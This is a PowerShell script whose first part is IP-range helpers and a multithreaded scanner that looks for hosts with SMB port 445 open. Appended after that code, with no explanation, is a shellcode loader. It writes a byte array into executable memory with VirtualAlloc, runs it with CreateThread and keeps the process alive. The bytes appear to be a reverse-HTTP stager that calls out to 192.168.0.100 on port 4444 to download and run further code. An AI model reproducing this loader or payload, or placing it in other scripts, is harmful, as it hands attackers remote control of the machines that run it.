function New-IPv4Range{param([Parameter(Mandatory=$true,ValueFromPipelineByPropertyName=$true,Position=0)]$StartIP,[Parameter(Mandatory=$true,ValueFromPipelineByPropertyName=$true,Position=2)]$EndIP      )$ip1 = ([System.Net.IPAddress]$StartIP).GetAddressBytes()[Array]::Reverse($ip1)$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address$ip2 = ([System.Net.IPAddress]$EndIP).GetAddressBytes()[Array]::Reverse($ip2)$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Addressfor ($x=$ip1; $x -le $ip2; $x++) {$ip = ([System.Net.IPAddress]$x).GetAddressBytes()[Array]::Reverse($ip)$ip -join '.'}}function New-IPRange{[CmdletBinding(DefaultParameterSetName='CIDR')]Param([parameter(Mandatory=$true,ParameterSetName = 'CIDR',Position=0)][string]$CIDR,[parameter(Mandatory=$true,ParameterSetName = 'Range',Position=0)][string]$Range   )if($CIDR){$IPPart,$MaskPart = $CIDR.Split('/')$AddressFamily = ([System.Net.IPAddress]::Parse($IPPart)).AddressFamily$subnetMaskObj = [IPHelper.IP.Subnetmask]::Parse($MaskPart, $AddressFamily)$StartIP = [IPHelper.IP.IPAddressAnalysis]::GetClasslessNetworkAddress($IPPart, $subnetMaskObj)$EndIP = [IPHelper.IP.IPAddressAnalysis]::GetClasslessBroadcastAddress($IPPart,$subnetMaskObj)$StartIP = [IPHelper.IP.IPAddressAnalysis]::Increase($StartIP)$EndIP = [IPHelper.IP.IPAddressAnalysis]::Decrease($EndIP)[IPHelper.IP.IPAddressAnalysis]::GetIPRange($StartIP, $EndIP)}elseif ($Range){$StartIP, $EndIP = $range.split('-')[IPHelper.IP.IPAddressAnalysis]::GetIPRange($StartIP, $EndIP)}}function New-IPv4RangeFromCIDR {param([Parameter(Mandatory=$true,ValueFromPipelineByPropertyName=$true,Position=0)]$Network)$StrNetworkAddress = ($Network.split('/'))[0][int]$NetworkLength = ($Network.split('/'))[1]$NetworkIP = ([System.Net.IPAddress]$StrNetworkAddress).GetAddressBytes()$IPLength = 32-$NetworkLength[Array]::Reverse($NetworkIP)$NumberOfIPs = ([System.Math]::Pow(2, $IPLength)) -1$NetworkIP = ([System.Net.IPAddress]($NetworkIP -join '.')).Address$StartIP = $NetworkIP +1$EndIP = $NetworkIP + $NumberOfIPsIf ($EndIP -isnot [double]){$EndIP = $EndIP -as [double]}If ($StartIP -isnot [double]){$StartIP = $StartIP -as [double]}$StartIP = ([System.Net.IPAddress]$StartIP).IPAddressToString$EndIP = ([System.Net.IPAddress]$EndIP).IPAddressToStringNew-IPv4Range $StartIP $EndIP}$runme ={param([Object]$IPAddress,[Object]$Creds,[Object]$Command)$getcreds = $Creds$Port = 445$Socket = New-Object Net.Sockets.TcpClient$Socket.client.ReceiveTimeout = 2000$ErrorActionPreference = 'SilentlyContinue'$Socket.Connect($IPAddress, $Port)$ErrorActionPreference = 'Continue'if ($Socket.Connected) {  $endpointResult = New-Object PSObject | Select-Object Host$endpointResult.Host = $IPAddress$Socket.Close()        } else {$portclosed = 'True'}$Socket = $nullreturn $endpointResult}function Invoke-Hostscan{param([Object]$IPAddress,[Object]$IPRangeCIDR,[Object]$IPList,[Object]$Threads)if ($IPList) {$iprangefull = Get-Content $IPList}if ($IPRangeCIDR) {$iprangefull = New-IPv4RangeFromCIDR $IPRangeCIDR}if ($IPAddress) {$iprangefull = $IPAddress}Write-Output ''Write-Output $iprangefull.count Total hosts read from file$jobs = @()$start = get-dateWrite-Output `n"Begin Scanning at $start" -ForegroundColor Redif (!$Threads){$Threads = 64}   $pool = [runspacefactory]::CreateRunspacePool(1, $Threads)   $pool.Open()$endpointResults = @()$jobs = @()   $ps = @()   $wait = @()$i = 0foreach ($endpoint in $iprangefull){while ($($pool.GetAvailableRunspaces()) -le 0) {Start-Sleep -milliseconds 500}$ps += [powershell]::create()$ps[$i].runspacepool = $pool[void]$ps[$i].AddScript($runme)[void]$ps[$i].AddParameter('IPAddress', $endpoint)[void]$ps[$i].AddParameter('Creds', $getcreds) [void]$ps[$i].AddParameter('Command', $Command)   $jobs += $ps[$i].BeginInvoke();$wait += $jobs[$i].AsyncWaitHandle$i++}Write-Output 'Waiting for scanning threads to finish...' -ForegroundColor Cyan$waitTimeout = get-datewhile ($($jobs | Where-Object {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(get-date) - $waitTimeout).totalSeconds) -gt 60) {Start-Sleep -milliseconds 500} for ($y = 0; $y -lt $i; $y++) {     try {   $endpointResults += $ps[$y].EndInvoke($jobs[$y])   } catch {   write-warning "error: $_"  }finally {$ps[$y].Dispose()}     }$pool.Dispose()$end = get-date$totaltime = $end - $startWrite-Output "We scanned $($iprangefull.count) endpoints in $($totaltime.totalseconds) seconds" -ForegroundColor green$endpointResults}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0x5c,0x11,0x00,0x00,0xe8,0x0f,0x01,0x00,0x00,0x2f,0x39,0x30,0x6b,0x72,0x41,0x50,0x43,0x42,0x4c,0x46,0x43,0x44,0x55,0x49,0x4a,0x52,0x31,0x64,0x37,0x31,0x69,0x67,0x70,0x68,0x36,0x33,0x44,0x51,0x78,0x37,0x64,0x63,0x5f,0x33,0x45,0x7a,0x45,0x6a,0x75,0x68,0x2d,0x5a,0x43,0x33,0x32,0x69,0x73,0x46,0x30,0x66,0x5f,0x44,0x7a,0x57,0x69,0x63,0x59,0x4d,0x48,0x33,0x34,0x77,0x6b,0x5f,0x74,0x77,0x6a,0x4f,0x62,0x35,0x36,0x42,0x4f,0x35,0x78,0x77,0x5a,0x7a,0x62,0x77,0x34,0x76,0x77,0x66,0x38,0x63,0x59,0x4f,0x69,0x49,0x74,0x49,0x51,0x43,0x56,0x71,0x69,0x50,0x47,0x49,0x50,0x4d,0x75,0x4d,0x4f,0x71,0x48,0x6d,0x30,0x55,0x39,0x67,0x77,0x4d,0x39,0x5a,0x30,0x39,0x4e,0x4a,0x56,0x65,0x35,0x64,0x75,0x65,0x65,0x58,0x45,0x47,0x49,0x77,0x63,0x33,0x37,0x45,0x38,0x78,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,0x30,0x30,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};